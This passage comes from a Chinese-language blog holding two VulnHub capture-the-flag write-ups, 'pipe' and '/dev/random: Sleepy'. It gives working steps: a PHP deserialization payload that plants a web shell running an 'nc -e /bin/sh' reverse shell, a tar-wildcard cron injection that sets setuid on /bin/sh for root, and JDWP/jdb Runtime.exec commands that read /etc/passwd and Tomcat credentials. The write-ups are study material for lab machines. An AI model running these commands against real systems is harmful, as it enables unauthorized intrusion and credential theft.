<p>按下頁面下方的Show Artist Info之後，瀏覽器會POST一些經過serialize處理後的資訊到index.php</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">param</span><span class="o">=</span>O:4:<span class="p">&amp;</span>ldquo<span class="p">;</span>Info<span class="p">&amp;</span>rdquo<span class="p">;</span>:4:<span class="o">{</span>s:2:<span class="p">&amp;</span>ldquo<span class="p">;</span>id<span class="p">&amp;</span>rdquo<span class="p">;;</span>i:1<span class="p">;</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>firstname<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:4:<span class="p">&amp;</span>ldquo<span class="p">;</span>Rene<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>surname<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:8:<span class="p">&amp;</span>ldquo<span class="p">;</span>Margitte<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>artwork<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:23:<span class="p">&amp;</span>ldquo<span class="p">;</span>The+Treachery+of+Images<span class="p">&amp;</span>rdquo<span class="p">;;</span><span class="o">}</span>&lt;/p&gt;

&lt;p&gt;</code></pre></div></p>

<p>serialize的做法在php.js</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">//   example 1: serialize<span class="o">([</span><span class="p">&amp;</span>lsquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>van<span class="p">&amp;</span>rsquo<span class="p">;</span>, <span class="p">&amp;</span>lsquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">])</span><span class="p">;</span>
//   returns 1: <span class="p">&amp;</span>lsquo<span class="p">;</span>a:3:<span class="o">{</span>i:0<span class="p">;</span>s:5:<span class="p">&amp;</span>ldquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rdquo<span class="p">;;</span>i:1<span class="p">;</span>s:3:<span class="p">&amp;</span>ldquo<span class="p">;</span>van<span class="p">&amp;</span>rdquo<span class="p">;;</span>i:2<span class="p">;</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rdquo<span class="p">;;</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span>
//   example 2: serialize<span class="o">({</span>firstName: <span class="p">&amp;</span>lsquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rsquo<span class="p">;</span>, midName: <span class="p">&amp;</span>lsquo<span class="p">;</span>van<span class="p">&amp;</span>rsquo<span class="p">;</span>, surName: <span class="p">&amp;</span>lsquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">})</span><span class="p">;</span>
//   returns 2: <span class="p">&amp;</span>lsquo<span class="p">;</span>a:3:<span class="o">{</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>firstName<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:5:<span class="p">&amp;</span>ldquo<span class="p">;</span>Kevin<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>midName<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:3:<span class="p">&amp;</span>ldquo<span class="p">;</span>van<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:7:<span class="p">&amp;</span>ldquo<span class="p">;</span>surName<span class="p">&amp;</span>rdquo<span class="p">;;</span>s:9:<span class="p">&amp;</span>ldquo<span class="p">;</span>Zonneveld<span class="p">&amp;</span>rdquo<span class="p">;;</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span></code></pre></div></p>

<p>接著將submit_form()的內容改成要送出的資訊</p>

<p><img class="center" src="/images/2015-12-23-pipe/html.png"></p>

<p>選擇送到scriptz是因為可以直接進到scriptz的目錄確認有沒有寫入成功</p>

<p><img class="center" src="/images/2015-12-23-pipe/yo.png"></p>

<p>而data的內容看起來也是成功寫入yo.php了</p>

<p><img class="center" src="/images/2015-12-23-pipe/yo2.png"></p>

<p>再來就試試看能不能送個reverse shell回來</p>

<p>直接修改html的內容</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;script&gt;
<span class="k">function</span> submit_form<span class="o">()</span> <span class="o">{</span>
  var <span class="nv">object</span> <span class="o">=</span> serialize<span class="o">({</span>filename: <span class="p">&amp;</span>lsquo<span class="p">;</span>/var/www/html/scriptz/shell.php<span class="p">&amp;</span>rsquo<span class="p">;</span>, data: <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>lt<span class="p">;</span>?php passthru<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>nc -e /bin/sh 192.168.0.115 22234<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span> ?&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">})</span><span class="p">;</span>
<span class="nv">object</span> <span class="o">=</span> object.substr<span class="o">(</span>object.indexOf<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">{</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>,object.length<span class="o">)</span><span class="p">;</span>
  <span class="nv">object</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>O:3:<span class="se">\&quot;</span>Log<span class="se">\&amp;</span>rdquo<span class="p">;</span>:2:<span class="p">&amp;</span>ldquo<span class="p">;</span> + object<span class="p">;</span>
document.forms<span class="o">[</span>0<span class="o">]</span>.param.value <span class="o">=</span> object<span class="p">;</span>
document.getElementById<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>info_form<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>.submit<span class="o">()</span><span class="p">;</span>
<span class="o">}</span>
&lt;/script&gt;</code></pre></div></p>

<p>連上 <a href="http://192.168.0.117/scriptz/shell.php">http://192.168.0.117/scriptz/shell.php</a> 之後瀏覽器就卡住了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nc -lp 22234
id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
uname -a
Linux pipe 3.16.0-4-amd64 <span class="c">#1 SMP Debian 3.16.7-ckt11-1 (2015-05-24) x86_64 GNU/Linux</span></code></pre></div></p>

<p>shell GET!</p>

<p>簡單地蒐集資訊之後，找到一個使用者 rene ，而且他的家目錄沒有擋權限</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">ls -al
total 208
drwxrwxrwx <span class="m">2</span> rene rene   <span class="m">4096</span> Dec <span class="m">23</span> 05:04 .
drwxr-xr-x <span class="m">3</span> rene rene   <span class="m">4096</span> Jul  <span class="m">6</span> 07:42 ..
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene <span class="m">124078</span> Dec <span class="m">23</span> 05:00 backup.tar.gz
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene  <span class="m">26558</span> Dec <span class="m">23</span> 05:02 sys-12512.BAK
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene  <span class="m">11402</span> Dec <span class="m">23</span> 05:01 sys-23924.BAK
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene   <span class="m">7231</span> Dec <span class="m">23</span> 05:04 sys-2448.BAK
-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> rene rene  <span class="m">27182</span> Dec <span class="m">23</span> 05:03 sys-5018.BAK</code></pre></div></p>

<p>backup目錄看起來每隔一分鐘就會生出一個檔案，每五分鐘就會打包一包backup.tar.gz</p>

<p>推測是有在跑cron，剛好/etc/crontab也可以讀取，就來看看cron的設定</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;h1&gt;/etc/crontab: system-wide crontab&lt;/h1&gt;

&lt;h1&gt;Unlike any other crontab you don<span class="p">&amp;</span>rsquo<span class="p">;</span>t have to run the <span class="sb">`</span>crontab<span class="err">&#39;</span>&lt;/h1&gt;

&lt;h1&gt;command to install the new version when you edit this file&lt;/h1&gt;

&lt;h1&gt;and files in /etc/cron.d. These files also have username fields,&lt;/h1&gt;

&lt;h1&gt;that none of the other crontabs <span class="k">do</span>.&lt;/h1&gt;

&lt;p&gt;SHELL<span class="o">=</span>/bin/sh
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin&lt;/p&gt;

&lt;h1&gt;m h dom mon dow user  <span class="nb">command</span>&lt;/h1&gt;

&lt;p&gt;17 *    * * *   root    <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.hourly
<span class="m">25</span> <span class="m">6</span>    * * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.daily <span class="o">)</span>
<span class="m">47</span> <span class="m">6</span>    * * <span class="m">7</span>   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.weekly <span class="o">)</span>
<span class="m">52</span> <span class="m">6</span>    <span class="m">1</span> * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> run-parts <span class="p">&amp;</span>ndash<span class="p">;</span>report /etc/cron.monthly <span class="o">)</span>
<span class="c">#</span>
* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh</code></pre></div></p>

<p>只能看到/usr/bin/compress.sh的內容</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">cat compress.sh&lt;/p&gt;

&lt;h1&gt;!/bin/sh&lt;/h1&gt;

&lt;p&gt;rm -f /home/rene/backup/backup.tar.gz
<span class="nb">cd</span> /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK</code></pre></div></p>

<p>這邊PATH的設定方式沒辦法達到替換指令的效果</p>

<p>看來只能<a href="http://www.net-security.org/article.php?id=2061">靠tar來做command injection</a>了</p>

<p>於是直接給/bin/sh加上了stickybit</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>chmod u+s /bin/sh<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt; shell.sh</code></pre></div></p>

<p>等時間一到就可以拿到root的權限了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;h1&gt;sh&lt;/h1&gt;

&lt;p&gt;sh&lt;/p&gt;

&lt;h1&gt;id&lt;/h1&gt;

&lt;p&gt;id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>&lt;/p&gt;

&lt;h1&gt;cat /root/flag.txt&lt;/h1&gt;

&lt;p&gt;cat /root/flag.txt
                                                                   .aMMMMMMMMn.  ,aMMMMn.
                                                                 .aMccccccccc&lt;em&gt;YMMn.    &lt;code&gt;Mb
                                                                aMccccccccccccccc*Mn    MP
                                                               .AMMMMn.   MM&lt;/code&gt;&lt;/em&gt;YMMY&lt;em&gt;ccaM&lt;/em&gt;
                                                              dM&lt;em&gt;  &lt;/em&gt;YMMb  YP        <span class="sb">`</span>cMY
                                                              YM.  .dMMP   aMn.     .cMP
                                                               &lt;em&gt;YMMn.     aMMMMMMMMMMMY<span class="s1">&#39;</span>
<span class="s1">                                                                .&amp;lsquo;YMMb.           ccMP</span>
<span class="s1">                                                             .dMcccccc&lt;/em&gt;Mc&amp;hellip;.cMb.cMP&amp;rsquo;</span>
<span class="s1">                                                           .dMMMMb;cccc&lt;em&gt;Mbcccc,IMMMMMMMn.</span>
<span class="s1">                                                          dY&lt;/em&gt;&amp;lsquo;  &amp;rsquo;&lt;em&gt;M;ccccMM..dMMM..MP&lt;/em&gt;cc&lt;em&gt;Mb</span>
<span class="s1">                                                          YM.    ,MbccMMMMMMMMMMMM&lt;/em&gt;cccc;MP</span>
<span class="s1">                                                           &lt;em&gt;Mbn;adMMMMMMMMMMMMMMMIcccc;M&lt;/em&gt;</span>
<span class="s1">                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP</span>
<span class="s1">                                                          Yb;cc;dMMMMMMMMMMMP&lt;em&gt;&amp;lsquo;  &lt;/em&gt;YMMP&lt;em&gt;</span>
<span class="s1">                                                           &lt;/em&gt;YMMMPYMMMMMMP*&amp;rsquo;          curchack</span>
<span class="s1">                                                       +####################################+</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       |======                            | |</span>
<span class="s1">                                                       +&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-+-+</span>
<span class="s1">                                                        ####################################</span>
<span class="s1">                                                             |======                  |</span>
<span class="s1">                                                             |======                  |</span>
<span class="s1">                                                             |=====                   |</span>
<span class="s1">                                                             |====                    |</span>
<span class="s1">                                                             |                        |</span>
<span class="s1">                                                             +                        +&lt;/p&gt;</span>

<span class="s1">&lt;p&gt; .d8888b.                 d8b          d8b               888                                                                    d8b</span>
<span class="s1">d88P  Y88b                Y8P          88P               888                                                                    Y8P</span>
<span class="s1">888    888                             8P                888</span>
<span class="s1">888        .d88b.  .d8888b888   88888b.&amp;ldquo;  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.</span>
<span class="s1">888       d8P  Y8bd88P&amp;rdquo;   888   888 &amp;ldquo;88b d8P  Y8b88K     888      888 &quot;88b    &quot;88b88K        888  888888 &quot;88bd8P  Y8b   888 &quot;88b888888 &quot;88bd8P  Y8b</span>
<span class="s1">888    88888888888888     888   888  888 88888888&quot;Y8888b.888      888  888.d888888&quot;Y8888b.   888  888888  88888888888   888  888888888  88888888888</span>
<span class="s1">Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b</span>
<span class="s1"> &quot;Y8888P&amp;rdquo;  &amp;ldquo;Y8888  &quot;Y8888P888   888  888  &quot;Y8888  88888P&#39;</span> <span class="s2">&quot;Y888   88888P&amp;rdquo; &amp;ldquo;Y888888 88888P&#39;    &quot;</span>Y88888888  <span class="m">888</span> <span class="s2">&quot;Y8888    88888P&amp;rdquo; 88888888P&quot;</span>  <span class="p">&amp;</span>ldquo<span class="p">;</span>Y8888Y8P
                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
                                                                  <span class="m">888</span>                                                   <span class="m">888</span>        888
Well Done!
Here<span class="p">&amp;</span>rsquo<span class="p">;</span>s your flag: 0089cd4f9ae79402cdd4e7b8931892b7</code></pre></div></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[/dev/random: Sleepy]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/20/sleepy/"/>
    <updated>2015-12-20T16:57:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/20/sleepy</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/devrandom-sleepy,123/">/dev/random: Sleepy</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p>nmap掃描結果如下</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/sleepy# nmap -n -T5 192.168.0.117 <span class="p">&amp;</span>ndash<span class="p">;</span>top-ports<span class="o">=</span><span class="m">5000</span> -A&lt;/p&gt;

&lt;p&gt;Starting Nmap 6.49BETA4 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-12-19 23:46 CST
Warning: 192.168.0.117 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
Nmap scan report <span class="k">for</span> 192.168.0.117
Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
Not shown: <span class="m">4250</span> filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
<span class="p">|</span>&lt;em&gt;Can<span class="p">&amp;</span>rsquo<span class="p">;</span>t get directory listing: TIMEOUT
8009/tcp open  ajp13   Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
<span class="p">|</span>&lt;/em&gt;ajp-methods: Failed to get a valid response <span class="k">for</span> the OPTION request
9001/tcp open  jdwp    Java Debug Wire Protocol <span class="o">(</span>Reference Implementation<span class="o">)</span> version 1.6 1.7.0_71
MAC Address: 08:00:27:79:0F:C3 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
Device <span class="nb">type</span>: general purpose
Running: Linux 2.6.X<span class="p">|</span>3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
Network Distance: <span class="m">1</span> hop&lt;/p&gt;

&lt;p&gt;TRACEROUTE
HOP RTT     ADDRESS
<span class="m">1</span>   0.31 ms 192.168.0.117&lt;/p&gt;

&lt;p&gt;OS and Service detection performed. Please report any incorrect results at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/submit/&quot;</span>&gt;https://nmap.org/submit/&lt;/a&gt; .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 58.34 seconds</code></pre></div></p>

<p>用anonymous登入ftp後只拿到一張看起來沒有線索的jpg檔，暫時先放到一邊</p>

<p>另外還開了兩個還沒遇過的port，用nc連過去都沒甚麼回應，先google一下一般開啟這兩個port的用途</p>

<p>port 8009大部分的用途是，<a href="https://en.wikipedia.org/wiki/Apache_JServ_Protocol">Apache JServ Protocol</a></p>

<p>說不定自己架一個apache server再proxy過去就能看到網頁了</p>

<p>不過要使用這個功能必須先安裝 libapache2-mod-jk</p>

<p>安裝後再<a href="https://rimuhosting.com/mod_jk2_and_mod_proxy_ajp.jsp">設定</a>讓自己的Apache Server proxy到目標ip後，用瀏覽器就能看到架好的Tomcat Server了</p>

<p><img class="center" src="/images/2015-12-20-sleepy/tomcat.png"></p>

<p>連上後先嘗試登入tomcat的管理介面</p>

<p>不過試了很多組密碼都沒有用，用dirbuster也沒找到可疑的目錄，只能暫時擱置，來看另一個開啟的port</p>

<p>port 9001通常用於<a href="http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html">Java Debug Wire Protocol</a>，可以讓使用者遠端debug JVM</p>

<p>首先找到這篇<a href="http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html">文章</a>，大意是可以透過連入JDWP達到Remote code execution的效果</p>

<p>不過實際拿他的exploit來用(metasploit其實也有內建exploit了)，發現很難猜到目標有使用的物件，繼續再找找有沒有替代方案</p>

<p>再來找到<a href="https://www.exploit-db.com/papers/27179/">這篇</a>：直接用jdb attach到目標後中斷程式，藉由建立新的物件達到執行命令的效果</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/sleepy# jdb -attach 192.168.0.117:9001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;</code></pre></div></p></blockquote>

<p>很順利地連上之後，先想辦法讓程式中斷</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;threads
Group system:
  <span class="o">(</span>java.lang.ref.Reference<span class="nv">$ReferenceHandler</span><span class="o">)</span>0x19d Reference Handler cond. waiting
  <span class="o">(</span>java.lang.ref.Finalizer<span class="nv">$FinalizerThread</span><span class="o">)</span>0x19e  Finalizer         cond. waiting
  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x19f                         Signal Dispatcher running
Group main:
  <span class="o">(</span>java.lang.Thread<span class="o">)</span>0x1a1                         main              sleeping
interrupt 0x1a1&lt;/p&gt;

&lt;p&gt;Exception occurred: java.lang.InterruptedException <span class="o">(</span>uncaught<span class="o">)</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">thread</span><span class="o">=</span>main<span class="p">&amp;</span>rdquo<span class="p">;</span>, java.lang.Thread.sleep<span class="o">()</span>, <span class="nv">line</span><span class="o">=</span>-1 <span class="nv">bci</span><span class="o">=</span>-1&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;main<span class="o">[</span>1<span class="o">]</span></code></pre></div></p>

<p>來試試讓目標彈一個reverse shell回來</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span>  print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>nc 192.168.0.115 <span class="m">12345</span> -e /bin/sh<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>                                         com.sun.tools.example.debug.expr.ParseException: Unable to create java.lang.Runtime instance
 new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>nc 192.168.0.115 <span class="m">12345</span> -e /bin/sh<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span> <span class="o">=</span> null</code></pre></div></p>

<p>失敗。接著換其他指令試試看</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cat /etc/passwd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
 new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cat /etc/passwd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>java.lang.UNIXProcess@6a059fa4<span class="p">&amp;</span>rdquo<span class="p">;</span></code></pre></div></p>

<p>看起來有成功產生物件，但卻看不到內容，稍微研究一下要怎麼<a href="http://stackoverflow.com/questions/4741878/redirect-runtime-getruntime-exec-output-with-system-setout">顯示exec的輸出</a>，拼湊出了下面這難看的解法</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cat /etc/passwd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>cat /etc/passwd<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>root:x:0:0:root:/root:/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span></code></pre></div></p>

<p>但是用這方法實在很難操作，後來想到可以找看看tomcat的管理帳密</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">1</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">1</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;/tomcat-users&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>
main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">2</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">2</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;&amp;</span>rdquo<span class="p">;</span>
main<span class="o">[</span>1<span class="o">]</span> print new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">3</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span>
 new java.lang.String<span class="o">(</span>new java.io.BufferedReader<span class="o">(</span>new java.io.InputStreamReader<span class="o">(</span>new java.lang.Runtime<span class="o">()</span>.exec<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>tail -n <span class="m">3</span> /etc/tomcat/tomcat-users.xml<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.getInputStream<span class="o">()))</span>.readLine<span class="o">())</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">&quot;sl33py&quot;</span> <span class="nv">password</span><span class="o">=</span><span class="s2">&quot;Gu3SSmYStR0NgPa$sw0rD!&quot;</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">&quot;tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status&quot;</span>/&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span></code></pre></div></p>

<p>帳號是 sl33py，密碼是 Gu3SSmYStR0NgPa$sw0rD。成功登入tomcat管理介面！</p>

<p><img class="center" src="/images/2015-12-20-sleepy/manager.png"></p>

<p>前面在研究tomcat密碼設定的過程中看到一篇<a href="http://roach0426.pixnet.net/blog/post/965149-tomcat%E5%85%A5%E4%BE%B5%E6%94%BB%E9%98%B2%E6%88%B0">文章</a>：有人的伺服器被打入管理介面後塞了一個.war檔進去。</p>

<p>所以就先從file upload+code execution的方向去找exploit</p>

<p>在kali下用searchsploit找看看</p>

